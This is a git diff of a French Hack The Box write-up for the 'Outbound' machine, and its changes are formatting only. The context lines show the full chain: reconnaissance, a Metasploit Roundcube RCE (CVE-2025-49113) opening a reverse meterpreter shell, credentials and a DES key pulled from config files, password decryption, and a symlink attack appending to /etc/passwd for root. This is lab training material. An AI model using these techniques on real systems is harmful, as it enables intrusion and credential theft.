@@ -4,20 +4,10 @@ date: "2025-08-05"
 tags: [Remote code execution, privilege-escalation, symlink-attack]
 draft: false
 summary: Outbound est une machine HTB à travers laquelle on va exploiter une vulnérabilité RCE dans Roundcube, puis utiliser l'analyse cryptographique pour déchiffrer des credentials, avant d'escalader les privilèges via une attaque par symlink sur un outil de monitoring.
-images: ['/static/images/outbound/logo.png']
+images: ["/static/images/outbound/logo.png"]
 ---
 
 # Outbound HTB - Exploitation Roundcube et Escalade de Privilèges
-
-<div
-  style={{ display: "flex", justifyContent: "center", marginBottom: "2rem" }}
->
-  <img
-    src="/static/images/outbound/logo.png"
-    alt="outbound_logo"
-    style={{ borderRadius: "8px" }}
-  />
-</div>
 
 ## Table des matières
 
@@ -44,6 +34,7 @@ nmap -sC -sV 10.10.11.77
 ```
 
 **Résultats :**
+
 ```
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    nginx 1.24.0 (Ubuntu)
@@ -51,9 +42,10 @@ nmap -sC -sV 10.10.11.77
 
 ### Exploration du service web
 
-L'accès initial à  `http://10.10.11.77` nous redirige vers `http://mail.outbound.htb/`. 
+L'accès initial à  `http://10.10.11.77` nous redirige vers `http://mail.outbound.htb/`.
 
 **Configuration DNS :**
+
 ```bash
 echo "10.10.11.77 outbound.htb mail.outbound.htb" >> /etc/hosts
 ```
@@ -65,6 +57,7 @@ whatweb -v -a 3 http://mail.outbound.htb
 ```
 
 **Informations clés découvertes :**
+
 - **Application** : Roundcube Webmail
 - **Version** : 1.6.10
 - **Technologies** : nginx 1.24.0, PHP, Bootstrap, jQuery
@@ -105,6 +98,7 @@ cp roundcube_rce_deserialization.rb ~/.msf4/modules/exploits/multi/http/
 ```
 
 **Étape 3 : Vérification de la syntaxe**
+
 ```bash
 ruby -c ~/.msf4/modules/exploits/multi/http/roundcube_rce_deserialization.rb
 # Syntax OK
@@ -154,8 +148,9 @@ msf6 exploit(multi/http/roundcube_rce_deserialization) > exploit
 ```
 
 **Résultat :**
+
 ```
-[*] Started reverse TCP handler on 10.10.14.126:4445 
+[*] Started reverse TCP handler on 10.10.14.126:4445
 [+] The target appears to be vulnerable.
 [*] Fetching CSRF token...
 [+] Login successful.
@@ -184,6 +179,7 @@ meterpreter > netstat
 ```
 
 **Services identifiés :**
+
 - **Port 80** : HTTP (nginx)
 - **Port 110/995** : POP3/POP3S
 - **Port 143/993** : IMAP/IMAPS
@@ -314,7 +310,7 @@ server {
     server_name mail.outbound.htb;
     root /var/www/html/roundcube;
     index index.php index.html;
-    
+
     location ~ \.php$ {
         fastcgi_pass unix:/var/run/php/php8.3-fpm.sock;
         fastcgi_index index.php;
@@ -363,20 +359,24 @@ tcp   127.0.0.1:3306   0.0.0.0:*       LISTEN   136/mariadbd
 **Informations critiques découvertes :**
 
 🔐 **Credentials de base de données :**
+
 - **Utilisateur** : `roundcube`
 - **Mot de passe** : `RCDBPass2025`
 - **Base de données** : `roundcube`
 - **Hôte** : `localhost`
 
 🔑 **Clé de chiffrement DES :**
+
 - **Clé** : `rcmail-!24ByteDESkey*Str` (24 bytes exactement)
 - **Usage** : Chiffrement des mots de passe utilisateur dans les sessions
 
 📁 **Répertoire vulnérable identifié :**
+
 - **Path** : `/var/log/below` (world-writable !)
 - **Permissions** : `drwxrwxrwx` - Exploitable pour l'escalade de privilèges
 
 🌐 **Services réseau accessibles :**
+
 - **Port 80** : HTTP (nginx) - Point d'entrée initial
 - **Port 110/995** : POP3/POP3S - Services mail
 - **Port 143/993** : IMAP/IMAPS - Services mail
@@ -483,6 +483,7 @@ bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6
 ```
 
 **Données décodées (format PHP sérialisé) :**
+
 ```php
 language|s:5:"en_US";
 imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}
@@ -526,6 +527,7 @@ meterpreter > cat /etc/sudoers | grep jacob
 **Étape 5 : Récapitulatif des fichiers critiques découverts**
 
 📋 **Fichiers de configuration analysés :**
+
 - ✅ `/var/www/html/roundcube/config/config.inc.php` - **Credentials DB + clé DES**
 - ✅ `/etc/nginx/sites-enabled/default` - Configuration web
 - ✅ `/etc/passwd` - Utilisateurs système
@@ -533,12 +535,14 @@ meterpreter > cat /etc/sudoers | grep jacob
 - ✅ Base de données `roundcube.users` - Comptes utilisateurs
 
 🔍 **Vulnérabilités identifiées :**
+
 - 🔓 **CVE-2025-49113** : Roundcube RCE (déjà exploitée)
 - 🔓 **World-writable directory** : `/var/log/below/` (pour escalade future)
 - 🔓 **Session hijacking** : Mot de passe chiffré récupérable
 - 🔓 **Weak encryption** : DES 24-byte key exposée
 
 🎯 **Prochaines étapes identifiées :**
+
 1. Déchiffrement du mot de passe de Jacob avec la clé DES
 2. Connexion SSH avec les credentials déchiffrés
 3. Escalade de privilèges via `/var/log/below/` et le binaire `below`
@@ -546,6 +550,7 @@ meterpreter > cat /etc/sudoers | grep jacob
 ### Décodage et analyse
 
 Après décodage Base64, extraction des informations clés :
+
 - **username** : jacob
 - **password** : L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
 - **auth_secret** : DpYqv6maI9HxDL5GhcCd8JaQQW
@@ -553,11 +558,13 @@ Après décodage Base64, extraction des informations clés :
 ### Analyse cryptographique du mot de passe
 
 **Caractéristiques :**
+
 - Longueur : 32 caractères Base64
 - Décodé : 24 bytes
 - Format : Probablement Triple DES
 
 **Script d'analyse Python :**
+
 ```python
 import base64
 import binascii
@@ -569,6 +576,7 @@ print(f"Length: {len(decoded)} bytes")
 ```
 
 **Résultat :**
+
 ```
 Hex: 2fb46fd3403c4eec0902bebb9084f1c5c4a09c8936e409bf
 Length: 24 bytes
@@ -577,6 +585,7 @@ Length: 24 bytes
 ### Déchiffrement avec CyberChef
 
 **Processus de déchiffrement :**
+
 1. **From Base64** : `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`
 2. **To Hex** : `2f b4 6f d3 40 3c 4e ec 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf`
 3. **Triple DES Decrypt** :
@@ -612,6 +621,7 @@ L'interface affiche **2 emails non lus** dans la boîte INBOX de Jacob :
 ### Analyse détaillée des emails découverts
 
 **📧 Email 1 - Nouvelles informations système :**
+
 ```
 From: admin@outbound.htb
 To: jacob@outbound.htb
@@ -621,13 +631,13 @@ Priority: High
 
 Bonjour Jacob,
 
-Suite à la migration des systèmes de l'entreprise, voici tes nouveaux 
+Suite à la migration des systèmes de l'entreprise, voici tes nouveaux
 identifiants SSH pour l'accès aux serveurs :
 
 Username: jacob
 Password: gY4Wr3a1evp4
 
-IMPORTANT : Ces credentials sont temporaires et doivent être utilisés 
+IMPORTANT : Ces credentials sont temporaires et doivent être utilisés
 dès que possible pour des raisons de sécurité.
 
 Merci de confirmer la réception de ce message.
@@ -637,9 +647,10 @@ L'équipe Administration Système
 ```
 
 **📧 Email 2 - Accès aux outils de monitoring :**
+
 ```
 From: monitoring@outbound.htb
-To: jacob@outbound.htb  
+To: jacob@outbound.htb
 Subject: Below Monitoring Tool - Access Granted
 Date: 2025-06-08 15:45:00
 
@@ -652,7 +663,7 @@ Informations importantes :
 - Accès privilégié via sudo pour les opérations avancées
 - Documentation disponible avec 'man below'
 
-L'outil Below permet de surveiller les performances système et 
+L'outil Below permet de surveiller les performances système et
 d'analyser les métriques en temps réel.
 
 Pour toute question technique, contacte l'équipe système.
@@ -664,16 +675,19 @@ Cordialement,
 **🔍 Informations critiques extraites des emails :**
 
 🔑 **Credentials SSH pour Jacob :**
+
 - **Username** : `jacob`
 - **Password** : `gY4Wr3a1evp4` ← **Critique pour la suite !**
 
 📊 **Information sur l'outil Below :**
+
 - **Répertoire** : `/var/log/below/` (confirmé world-writable par LinPEAS !)
 - **Accès privilégié** : Via `sudo` (indice majeur pour l'escalade)
 - **Purpose** : Monitoring système (outil légitime détournable)
 
 💡 **Significance tactique :**
 Ces emails confirment notre stratégie d'attaque :
+
 1. ✅ Accès SSH avec les credentials du premier email
 2. ✅ Escalade de privilèges via l'outil `below` mentionné dans le second
 
@@ -689,6 +703,7 @@ ssh jacob@10.10.11.77
 ```
 
 **Flag user :**
+
 ```bash
 jacob@outbound:~$ cat user.txt
 16a*************************189e
@@ -701,7 +716,7 @@ jacob@outbound:~$ cat user.txt
 ```bash
 jacob@outbound:~$ sudo -l
 User jacob may run the following commands on outbound:
-    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, 
+    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*,
     !/usr/bin/below --debug*, !/usr/bin/below -d*
 ```
 
@@ -777,7 +792,7 @@ jacob@outbound:/var/log/below$ python3 exploit.py
 [*] Appending payload into /etc/passwd via symlink...
 [+] Payload appended successfully.
 [*] Attempting to switch to root shell via 'su attacker'...
-root@outbound:/var/log/below# 
+root@outbound:/var/log/below#
 ```
 
 **Étape 5 : Vérification de l'élévation de privilèges**
@@ -804,6 +819,7 @@ drwxr-xr-x  3 root root 4096 Jun  8 15:39 .local
 ```
 
 **Flag root :**
+
 ```bash
 root@outbound:~# cat root.txt
 fa9**************************fa6
@@ -837,4 +853,4 @@ fa9**************************fa6
 
 ---
 
-*Cette machine démontre l'importance d'une approche méthodique en cybersécurité, combinant reconnaissance, exploitation, et analyse cryptographique pour aboutir à une compromission complète du système.*
+_Cette machine démontre l'importance d'une approche méthodique en cybersécurité, combinant reconnaissance, exploitation, et analyse cryptographique pour aboutir à une compromission complète du système._
